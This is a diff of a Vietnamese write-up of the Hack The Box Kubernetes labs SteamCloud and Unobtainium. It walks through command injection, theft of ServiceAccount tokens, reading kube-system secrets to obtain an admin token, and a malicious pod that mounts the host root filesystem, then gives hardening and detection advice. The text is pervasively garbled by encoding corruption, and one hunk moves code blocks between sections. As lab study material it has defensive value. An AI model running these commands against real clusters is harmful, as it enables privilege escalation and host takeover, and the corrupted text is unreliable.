-- B?t Kubelet authentication/authorization dúng cách.
-- RBAC theo nguyên t?c least privilege, không c?p `create pods` b?a bãi.
-- Dùng Pod Security Admission/Kyverno/Gatekeeper d? ch?n:
+- Khï¿½ng expose Kubelet API ra ngoï¿½i network khï¿½ng tin c?y.
+- T?t ho?c h?n ch? anonymous access vï¿½o Kubelet.
+- B?t Kubelet authentication/authorization dï¿½ng cï¿½ch.
+- RBAC theo nguyï¿½n t?c least privilege, khï¿½ng c?p `create pods` b?a bï¿½i.
+- Dï¿½ng Pod Security Admission/Kyverno/Gatekeeper d? ch?n:
   - `hostPath` mount `/`
   - `hostNetwork: true`
   - `hostPID: true`
   - `privileged: true`
-- T?t `automountServiceAccountToken` n?u pod không c?n g?i Kubernetes API:
+- T?t `automountServiceAccountToken` n?u pod khï¿½ng c?n g?i Kubernetes API:
 
 ```yaml
 automountServiceAccountToken: false
 ```
 
-- Giám sát hành vi runtime b?ng Falco/Tetragon. Các event dáng chú ý:
-  - Pod m?i có `hostPath` mount `/`.
+- Giï¿½m sï¿½t hï¿½nh vi runtime b?ng Falco/Tetragon. Cï¿½c event dï¿½ng chï¿½ ï¿½:
+  - Pod m?i cï¿½ `hostPath` mount `/`.
   - Pod b?t `hostNetwork` ho?c `privileged`.
   - Truy c?p file ServiceAccount token.
-  - Exec b?t thu?ng vào container qua Kubelet.
+  - Exec b?t thu?ng vï¿½o container qua Kubelet.
 
 ### 15. Takeaway
 
-SteamCloud cho th?y m?t lesson r?t quan tr?ng: **không c?n CVE v?n có th? chi?m node Kubernetes n?u Kubelet/RBAC/Pod Security b? c?u hình sai**. M?t ServiceAccount tu?ng nhu ch? có quy?n `create pods` trong namespace `default` v?n có th? b? l?m d?ng d? t?o pod mount filesystem c?a host, t? dó d?c flag ho?c cài SSH key d? l?y root shell.
+SteamCloud cho th?y m?t lesson r?t quan tr?ng: **khï¿½ng c?n CVE v?n cï¿½ th? chi?m node Kubernetes n?u Kubelet/RBAC/Pod Security b? c?u hï¿½nh sai**. M?t ServiceAccount tu?ng nhu ch? cï¿½ quy?n `create pods` trong namespace `default` v?n cï¿½ th? b? l?m d?ng d? t?o pod mount filesystem c?a host, t? dï¿½ d?c flag ho?c cï¿½i SSH key d? l?y root shell.
 
 
 ## HTB Unobtainium - RBAC Abuse + Secret Access + Malicious Pod
@@ -623,37 +623,37 @@ SteamCloud cho th?y m?t lesson r?t quan tr?ng: **không c?n CVE v?n có th? chi?m 
 
 
 > **Ngu?n tham kh?o:** https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html  
-> **Ð? khó:** Hard  
+> **ï¿½? khï¿½:** Hard  
 
 
-### 1. T?ng quan chain khai thác
+### 1. T?ng quan chain khai thï¿½c
 
-Unobtainium là bài Kubernetes khó hon SteamCloud vì không don gi?n là có ngay quy?n t?o pod. Lu?ng chính:
+Unobtainium lï¿½ bï¿½i Kubernetes khï¿½ hon SteamCloud vï¿½ khï¿½ng don gi?n lï¿½ cï¿½ ngay quy?n t?o pod. Lu?ng chï¿½nh:
 
 ```text
 Web/Electron app reverse
 ? LFI / l?y source + credential
 ? Prototype Pollution
 ? Command Injection
-? RCE vào container webapp
+? RCE vï¿½o container webapp
 ? L?y ServiceAccount token default
 ? Enumerate RBAC
-? Tìm namespace dev và pod devnode
-? RCE ti?p vào devnode container
+? Tï¿½m namespace dev vï¿½ pod devnode
+? RCE ti?p vï¿½o devnode container
 ? L?y dev ServiceAccount token
-? dev token có quy?n get/list secrets trong kube-system
-? Ð?c c-admin service account token
-? c-admin có quy?n *.* [*]
+? dev token cï¿½ quy?n get/list secrets trong kube-system
+? ï¿½?c c-admin service account token
+? c-admin cï¿½ quy?n *.* [*]
 ? T?o malicious pod mount hostPath /
-? Ð?c root.txt / ki?m soát host filesystem
+? ï¿½?c root.txt / ki?m soï¿½t host filesystem
 ```
 
-Ði?m c?n h?c cho d? tài VDT:
+ï¿½i?m c?n h?c cho d? tï¿½i VDT:
 
-- **ServiceAccount token trong pod là credential th?t** d? g?i Kubernetes API.
-- **RBAC theo namespace có th? t?o du?ng pivot**: token A không m?nh ? namespace `default`, nhung l?i có quy?n h?u ích ? namespace `dev`.
-- **Quy?n `get/list secrets` trong `kube-system` c?c k? nguy hi?m**, vì có th? d?c token c?a ServiceAccount m?nh hon.
-- Sau khi có token admin, k? thu?t k?t thúc gi?ng SteamCloud: t?o pod mount filesystem host.
+- **ServiceAccount token trong pod lï¿½ credential th?t** d? g?i Kubernetes API.
+- **RBAC theo namespace cï¿½ th? t?o du?ng pivot**: token A khï¿½ng m?nh ? namespace `default`, nhung l?i cï¿½ quy?n h?u ï¿½ch ? namespace `dev`.
+- **Quy?n `get/list secrets` trong `kube-system` c?c k? nguy hi?m**, vï¿½ cï¿½ th? d?c token c?a ServiceAccount m?nh hon.
+- Sau khi cï¿½ token admin, k? thu?t k?t thï¿½c gi?ng SteamCloud: t?o pod mount filesystem host.
 
 ### 2. Recon Kubernetes
 
@@ -670,7 +670,7 @@ Nmap th?y nhi?u port quen thu?c c?a Kubernetes/minikube:
 31337/tcp  Node.js Express API
 ```
 
-Port `8443` tr? JSON ki?u Kubernetes API và báo `system:anonymous` b? forbidden, xác nh?n dây là API Server:
+Port `8443` tr? JSON ki?u Kubernetes API vï¿½ bï¿½o `system:anonymous` b? forbidden, xï¿½c nh?n dï¿½y lï¿½ API Server:
 
 ```text
 forbidden: User "system:anonymous" cannot get path "/"
@@ -678,14 +678,14 @@ forbidden: User "system:anonymous" cannot get path "/"
 
 ### 3. Ph?n RCE ban d?u - ghi so
 
-Bài g?c có ph?n reverse Electron package d? l?y source/credential. Sau dó tìm du?c API Node.js có logic upload b? ?nh hu?ng b?i prototype pollution.
+Bï¿½i g?c cï¿½ ph?n reverse Electron package d? l?y source/credential. Sau dï¿½ tï¿½m du?c API Node.js cï¿½ logic upload b? ?nh hu?ng b?i prototype pollution.
 
-Ý tu?ng ng?n:
+ï¿½ tu?ng ng?n:
 
-1. Dùng credential h?p l? d? g?i message.
+1. Dï¿½ng credential h?p l? d? g?i message.
 2. Prototype pollution set `canUpload: true`.
-3. Route `/upload` g?i command x? lý file nhung n?i `filename` không an toàn.
-4. Inject command qua `filename` d? có RCE.
+3. Route `/upload` g?i command x? lï¿½ file nhung n?i `filename` khï¿½ng an toï¿½n.
+4. Inject command qua `filename` d? cï¿½ RCE.
 
 Payload b?t quy?n upload:
 
@@ -710,7 +710,7 @@ root@webapp-deployment-...:/usr/src/app# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Luu ý: `root` ? dây v?n là root **trong container**, chua ph?i root c?a node.
+Luu ï¿½: `root` ? dï¿½y v?n lï¿½ root **trong container**, chua ph?i root c?a node.
 
 ### 4. L?y token trong webapp container
 
@@ -723,7 +723,7 @@ cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
 cat /run/secrets/kubernetes.io/serviceaccount/namespace
 ```
 
-Các file thu?ng g?p:
+Cï¿½c file thu?ng g?p:
 
 ```text
 ca.crt
@@ -731,14 +731,14 @@ namespace
 token
 ```
 
-Luu token ra máy attacker, ví d?:
+Luu token ra mï¿½y attacker, vï¿½ d?:
 
 ```bash
 cat /run/secrets/kubernetes.io/serviceaccount/token > default-token
 cat /run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
 ```
 
-Dùng token g?i API Server:
+Dï¿½ng token g?i API Server:
 
 ```bash
 kubectl --token $(cat default-token) \
@@ -747,7 +747,7 @@ kubectl --token $(cat default-token) \
   get pods --all-namespaces
 ```
 
-Ban d?u b? forbidden v?i pods toàn cluster, nhung ph?n h?i này v?n ch?ng minh token dùng du?c v?i API Server.
+Ban d?u b? forbidden v?i pods toï¿½n cluster, nhung ph?n h?i nï¿½y v?n ch?ng minh token dï¿½ng du?c v?i API Server.
 
 ### 5. Enumerate RBAC v?i token default
 
@@ -760,7 +760,7 @@ kubectl auth can-i --list \
   --certificate-authority ca.crt
 ```
 
-Token default có quy?n dáng chú ý:
+Token default cï¿½ quy?n dï¿½ng chï¿½ ï¿½:
 
 ```text
 namespaces    [get list]
@@ -775,7 +775,7 @@ kubectl get namespaces \
   --certificate-authority ca.crt
 ```
 
-K?t qu? có namespace `dev`:
+K?t qu? cï¿½ namespace `dev`:
 
 ```text
 default
@@ -794,16 +794,16 @@ kubectl auth can-i --list -n dev \
   --certificate-authority ca.crt
 ```
 
-Trong namespace `dev`, token default có thêm quy?n:
+Trong namespace `dev`, token default cï¿½ thï¿½m quy?n:
 
 ```text
 namespaces    [get list]
 pods          [get list]
 ```
 
-Ðây là pivot d?u tiên: token không t?o du?c pod, không d?c secret, nhung có th? **li?t kê pod ? namespace dev**.
+ï¿½ï¿½y lï¿½ pivot d?u tiï¿½n: token khï¿½ng t?o du?c pod, khï¿½ng d?c secret, nhung cï¿½ th? **li?t kï¿½ pod ? namespace dev**.
 
-### 6. Tìm pod devnode trong namespace dev
+### 6. Tï¿½m pod devnode trong namespace dev
 
 List pod trong namespace `dev`:
 
@@ -814,7 +814,7 @@ kubectl get pods -n dev \
   --certificate-authority ca.crt
 ```
 
-K?t qu? có các pod d?ng:
+K?t qu? cï¿½ cï¿½c pod d?ng:
 
 ```text
 devnode-deployment-cd86fb5c-6ms8d
@@ -831,7 +831,7 @@ kubectl describe pod devnode-deployment-cd86fb5c-qlxww -n dev \
   --certificate-authority ca.crt
 ```
 
-Thông tin dáng chú ý:
+Thï¿½ng tin dï¿½ng chï¿½ ï¿½:
 
 ```text
 Namespace: dev
@@ -841,13 +841,13 @@ Port: 3000/TCP
 Mounts: /var/run/secrets/kubernetes.io/serviceaccount
 ```
 
-T? shell webapp container có th? reach pod devnode qua IP n?i b?. Scan/ping th?y port `3000` m?.
+T? shell webapp container cï¿½ th? reach pod devnode qua IP n?i b?. Scan/ping th?y port `3000` m?.
 
 ### 7. RCE sang devnode container
 
-?ng d?ng ? devnode ch?y cùng code/vuln Node.js nên có th? dùng l?i chain prototype pollution + command injection.
+?ng d?ng ? devnode ch?y cï¿½ng code/vuln Node.js nï¿½n cï¿½ th? dï¿½ng l?i chain prototype pollution + command injection.
 
-T? webapp container, b?t `canUpload` trên devnode:
+T? webapp container, b?t `canUpload` trï¿½n devnode:
 
 ```bash
 curl -X PUT http://172.17.0.3:3000/ \
@@ -882,7 +882,7 @@ K?t qu?:
 dev
 ```
 
-### 8. L?y dev token và ki?m tra RBAC
+### 8. L?y dev token vï¿½ ki?m tra RBAC
 
 L?y token trong devnode:
 
@@ -890,7 +890,7 @@ L?y token trong devnode:
 cat /run/secrets/kubernetes.io/serviceaccount/token > dev-token
 ```
 
-Ki?m tra quy?n token này:
+Ki?m tra quy?n token nï¿½y:
 
 ```bash
 kubectl auth can-i --list \
@@ -899,7 +899,7 @@ kubectl auth can-i --list \
   --certificate-authority ca.crt
 ```
 
-? namespace `dev` không có gì quá m?nh. Nhung khi ki?m tra namespace `kube-system`:
+? namespace `dev` khï¿½ng cï¿½ gï¿½ quï¿½ m?nh. Nhung khi ki?m tra namespace `kube-system`:
 
 ```bash
 kubectl auth can-i --list -n kube-system \
@@ -908,15 +908,15 @@ kubectl auth can-i --list -n kube-system \
   --certificate-authority ca.crt
 ```
 
-Phát hi?n quy?n c?c k? quan tr?ng:
+Phï¿½t hi?n quy?n c?c k? quan tr?ng:
 
 ```text
 secrets    [get list]
 ```
 
-Ðây là l?i RBAC chính c?a bài: ServiceAccount trong namespace `dev` l?i có quy?n d?c secrets trong `kube-system`.
+ï¿½ï¿½y lï¿½ l?i RBAC chï¿½nh c?a bï¿½i: ServiceAccount trong namespace `dev` l?i cï¿½ quy?n d?c secrets trong `kube-system`.
 
-### 9. Ð?c ServiceAccount token m?nh hon trong kube-system
+### 9. ï¿½?c ServiceAccount token m?nh hon trong kube-system
 
 List secrets trong `kube-system`:
 
@@ -927,7 +927,7 @@ kubectl get secrets -n kube-system \
   --certificate-authority ca.crt
 ```
 
-Trong danh sách có secret dáng chú ý:
+Trong danh sï¿½ch cï¿½ secret dï¿½ng chï¿½ ï¿½:
 
 ```text
 c-admin-token-tfmp2    kubernetes.io/service-account-token
@@ -942,7 +942,7 @@ kubectl describe secret c-admin-token-tfmp2 -n kube-system \
   --certificate-authority ca.crt
 ```
 
-Secret này thu?c ServiceAccount:
+Secret nï¿½y thu?c ServiceAccount:
 
 ```text
 kubernetes.io/service-account.name: c-admin
@@ -951,11 +951,11 @@ kubernetes.io/service-account.name: c-admin
 Luu token admin ra file:
 
 ```bash
-# copy ph?n token trong output vào file
+# copy ph?n token trong output vï¿½o file
 nano cadmin-token
 ```
 
-Ho?c dùng jsonpath n?u API tr? d? data:
+Ho?c dï¿½ng jsonpath n?u API tr? d? data:
 
 ```bash
 kubectl get secret c-admin-token-tfmp2 -n kube-system \
@@ -965,7 +965,7 @@ kubectl get secret c-admin-token-tfmp2 -n kube-system \
   -o jsonpath='{.data.token}' | base64 -d > cadmin-token
 ```
 
-### 10. Xác nh?n quy?n admin
+### 10. Xï¿½c nh?n quy?n admin
 
 Ki?m tra quy?n c?a `cadmin-token`:
 
@@ -983,20 +983,9 @@ K?t qu? quan tr?ng:
 [*]    []    [*]
 ```
 
-Nghia là token này có quy?n full admin trên cluster.
+Nghia lï¿½ token nï¿½y cï¿½ quy?n full admin trï¿½n cluster.
 
-Có th? list pods toàn cluster:
-
-```bash
-kubectl get pods --all-namespaces \
-  --token $(cat cadmin-token) \
-  --server https://10.10.10.235:8443 \
-  --certificate-authority ca.crt
-```
-
-### 11. Tìm image local d? t?o malicious pod
-
-Vì box không có internet, không nên dùng image t? Docker Hub. Tìm image dang có s?n trong cluster:
+Cï¿½ th? list pods toï¿½n cluster:
 
 ```bash
 kubectl get pods --all-namespaces \
@@ -1005,7 +994,18 @@ kubectl get pods --all-namespaces \
   --certificate-authority ca.crt
 ```
 
-Dump YAML t?ng pod d? tìm image:
+### 11. Tï¿½m image local d? t?o malicious pod
+
+Vï¿½ box khï¿½ng cï¿½ internet, khï¿½ng nï¿½n dï¿½ng image t? Docker Hub. Tï¿½m image dang cï¿½ s?n trong cluster:
+
+```bash
+kubectl get pods --all-namespaces \
+  --token $(cat cadmin-token) \
+  --server https://10.10.10.235:8443 \
+  --certificate-authority ca.crt
+```
+
+Dump YAML t?ng pod d? tï¿½m image:
 
 ```bash
 kubectl get pod <pod-name> -o yaml -n <namespace> \
@@ -1014,14 +1014,14 @@ kubectl get pod <pod-name> -o yaml -n <namespace> \
   --certificate-authority ca.crt | grep 'image:'
 ```
 
-Các image có s?n:
+Cï¿½c image cï¿½ s?n:
 
 ```text
 localhost:5000/dev-alpine
 localhost:5000/node_server
 ```
 
-Ch?n `localhost:5000/dev-alpine` vì nh? và có shell.
+Ch?n `localhost:5000/dev-alpine` vï¿½ nh? vï¿½ cï¿½ shell.
 
 ### 12. T?o malicious pod mount filesystem host
 
@@ -1050,14 +1050,14 @@ spec:
   hostNetwork: true
 ```
 
-Gi?i thích:
+Gi?i thï¿½ch:
 
-- `namespace: kube-system`: dã có admin nên có th? t?o pod ? namespace nh?y c?m.
-- `image: localhost:5000/dev-alpine`: dùng image local có s?n.
+- `namespace: kube-system`: dï¿½ cï¿½ admin nï¿½n cï¿½ th? t?o pod ? namespace nh?y c?m.
+- `image: localhost:5000/dev-alpine`: dï¿½ng image local cï¿½ s?n.
 - `hostPath.path: /`: mount root filesystem c?a node.
 - `mountPath: /mnt`: trong container, host filesystem n?m ? `/mnt`.
-- `sleep 300000`: gi? container s?ng d? còn `kubectl exec` vào.
-- `hostNetwork: true`: dùng network namespace c?a host.
+- `sleep 300000`: gi? container s?ng d? cï¿½n `kubectl exec` vï¿½o.
+- `hostNetwork: true`: dï¿½ng network namespace c?a host.
 
 Apply pod:
 
@@ -1068,7 +1068,7 @@ kubectl apply -f root.yaml \
   --certificate-authority ca.crt
 ```
 
-Exec vào pod:
+Exec vï¿½o pod:
 
 ```bash
 kubectl exec evil-pod --stdin --tty -n kube-system \
@@ -1078,35 +1078,35 @@ kubectl exec evil-pod --stdin --tty -n kube-system \
   -- /bin/sh
 ```
 
-Ð?c root flag:
+ï¿½?c root flag:
 
 ```bash
 cd /mnt/root
 cat root.txt
 ```
 
-### 13. Ði?m khác v?i SteamCloud
+### 13. ï¿½i?m khï¿½c v?i SteamCloud
 
 | N?i dung | SteamCloud | Unobtainium |
 |---|---|---|
-| Initial K8s access | Kubelet API cho exec tr?c ti?p vào nginx | RCE webapp qua app vuln |
-| Token d?u tiên | Token trong nginx pod | Token trong webapp pod |
-| RBAC ban d?u | Có `create pods` ngay trong default | Ch? list namespace, list pod ? dev |
-| Pivot chính | T?o pod mount hostPath tr?c ti?p | Pivot sang dev pod, l?y dev token |
-| L?i RBAC n?ng | `create pods` quá r?ng | dev token d?c du?c secrets ? kube-system |
-| Admin token | Không c?n admin token | Ð?c `c-admin-token` t? kube-system |
+| Initial K8s access | Kubelet API cho exec tr?c ti?p vï¿½o nginx | RCE webapp qua app vuln |
+| Token d?u tiï¿½n | Token trong nginx pod | Token trong webapp pod |
+| RBAC ban d?u | Cï¿½ `create pods` ngay trong default | Ch? list namespace, list pod ? dev |
+| Pivot chï¿½nh | T?o pod mount hostPath tr?c ti?p | Pivot sang dev pod, l?y dev token |
+| L?i RBAC n?ng | `create pods` quï¿½ r?ng | dev token d?c du?c secrets ? kube-system |
+| Admin token | Khï¿½ng c?n admin token | ï¿½?c `c-admin-token` t? kube-system |
 | Root host | Pod mount `/` c?a host | Pod mount `/` c?a host |
 
-### 14. Bài h?c RBAC cho d? tài VDT
+### 14. Bï¿½i h?c RBAC cho d? tï¿½i VDT
 
-Unobtainium minh h?a r?t rõ m?t chu?i leo thang ki?u th?c t?:
+Unobtainium minh h?a r?t rï¿½ m?t chu?i leo thang ki?u th?c t?:
 
 ```text
 Pod compromise
 ? d?c ServiceAccount token
 ? ki?m tra RBAC t?ng namespace
-? tìm namespace có quy?n khác thu?ng
-? pivot sang workload khác
+? tï¿½m namespace cï¿½ quy?n khï¿½c thu?ng
+? pivot sang workload khï¿½c
 ? l?y token m?i
 ? d?c secrets nh?y c?m
 ? chi?m ServiceAccount admin
@@ -1114,52 +1114,52 @@ Pod compromise
 ? host filesystem access
 ```
 
-Các l?i c?u hình chính:
+Cï¿½c l?i c?u hï¿½nh chï¿½nh:
 
-- Pod du?c t? d?ng mount ServiceAccount token dù app không ch?c c?n g?i API Server.
-- ServiceAccount `default` có quy?n list namespace và list pods ? `dev`, giúp attacker khám phá lateral movement path.
-- ServiceAccount ? `dev` có quy?n `get/list secrets` trong `kube-system`, dây là quy?n c?c k? nguy hi?m.
-- Secret ki?u `kubernetes.io/service-account-token` ch?a token có th? dùng ngay d? impersonate ServiceAccount tuong ?ng.
-- Không có policy ch?n pod mount `hostPath: /`.
+- Pod du?c t? d?ng mount ServiceAccount token dï¿½ app khï¿½ng ch?c c?n g?i API Server.
+- ServiceAccount `default` cï¿½ quy?n list namespace vï¿½ list pods ? `dev`, giï¿½p attacker khï¿½m phï¿½ lateral movement path.
+- ServiceAccount ? `dev` cï¿½ quy?n `get/list secrets` trong `kube-system`, dï¿½y lï¿½ quy?n c?c k? nguy hi?m.
+- Secret ki?u `kubernetes.io/service-account-token` ch?a token cï¿½ th? dï¿½ng ngay d? impersonate ServiceAccount tuong ?ng.
+- Khï¿½ng cï¿½ policy ch?n pod mount `hostPath: /`.
 
 ### 15. Hardening / Detection
 
-Hardening nên ghi vào báo cáo:
+Hardening nï¿½n ghi vï¿½o bï¿½o cï¿½o:
 
-- Không dùng ServiceAccount `default` cho workload th?t.
-- T?t mount token n?u app không c?n:
+- Khï¿½ng dï¿½ng ServiceAccount `default` cho workload th?t.
+- T?t mount token n?u app khï¿½ng c?n:
 
 ```yaml
 automountServiceAccountToken: false
 ```
 
-- RBAC least privilege theo namespace, không c?p `get/list secrets` tr? khi th?t s? c?n.
+- RBAC least privilege theo namespace, khï¿½ng c?p `get/list secrets` tr? khi th?t s? c?n.
 - Tuy?t d?i h?n ch? quy?n d?c secrets trong `kube-system`.
-- Dùng short-lived bound tokens thay vì long-lived ServiceAccount token secret n?u có th?.
+- Dï¿½ng short-lived bound tokens thay vï¿½ long-lived ServiceAccount token secret n?u cï¿½ th?.
 - B?t Pod Security Admission/Kyverno/Gatekeeper d? ch?n:
   - `hostPath` mount `/`
   - `hostNetwork: true`
   - `privileged: true`
-  - pod ch?y root không c?n thi?t
-- Audit API Server cho các hành vi:
+  - pod ch?y root khï¿½ng c?n thi?t
+- Audit API Server cho cï¿½c hï¿½nh vi:
   - `get/list secrets` trong `kube-system`
   - `describe/get secret *-token-*`
-  - t?o pod m?i có `hostPath`
+  - t?o pod m?i cï¿½ `hostPath`
   - `kubectl exec` b?t thu?ng
-- Falco/Tetragon rule nên chú ý:
+- Falco/Tetragon rule nï¿½n chï¿½ ï¿½:
   - Process trong container d?c `/run/secrets/kubernetes.io/serviceaccount/token`.
   - Container mount host root filesystem.
   - Shell du?c spawn trong container ?ng d?ng.
 
 ### 16. Takeaway
 
-Unobtainium là ví d? hay hon SteamCloud cho ph?n **leo thang d?c quy?n theo chu?i RBAC**. Attacker không có quy?n admin ngay t? d?u, nhung b?ng cách d?c token trong pod, ki?m tra quy?n theo t?ng namespace, pivot sang pod khác và l?m d?ng quy?n d?c secrets trong `kube-system`, cu?i cùng v?n l?y du?c token admin và t?o pod mount filesystem host.
+Unobtainium lï¿½ vï¿½ d? hay hon SteamCloud cho ph?n **leo thang d?c quy?n theo chu?i RBAC**. Attacker khï¿½ng cï¿½ quy?n admin ngay t? d?u, nhung b?ng cï¿½ch d?c token trong pod, ki?m tra quy?n theo t?ng namespace, pivot sang pod khï¿½c vï¿½ l?m d?ng quy?n d?c secrets trong `kube-system`, cu?i cï¿½ng v?n l?y du?c token admin vï¿½ t?o pod mount filesystem host.
 
 
 
-## K?t thúc 
+## K?t thï¿½c 
 
-Thì dây là các bài lab mà tui h?c du?c trong quá trình tìm hi?u v? ki thu?t khai thác leo thang d?c quy?n trên K8s , thì ch? y?u d?u khai thác do misconfig và l?i RBAC c?p quy?n quá r?ng. Qua dó có th? th?y r?ng n?u trong môi tru?ng th?c t? , các l? h?ng dôi khi không d?n t? các zero-day mà d?n t? b?n thân con ngu?i. Hôm nay t?i dây thui, h?n các b?n ? bài s?p t?i !!!!.
+Thï¿½ dï¿½y lï¿½ cï¿½c bï¿½i lab mï¿½ tui h?c du?c trong quï¿½ trï¿½nh tï¿½m hi?u v? ki thu?t khai thï¿½c leo thang d?c quy?n trï¿½n K8s , thï¿½ ch? y?u d?u khai thï¿½c do misconfig vï¿½ l?i RBAC c?p quy?n quï¿½ r?ng. Qua dï¿½ cï¿½ th? th?y r?ng n?u trong mï¿½i tru?ng th?c t? , cï¿½c l? h?ng dï¿½i khi khï¿½ng d?n t? cï¿½c zero-day mï¿½ d?n t? b?n thï¿½n con ngu?i. Hï¿½m nay t?i dï¿½y thui, h?n cï¿½c b?n ? bï¿½i s?p t?i !!!!.
 
 
 
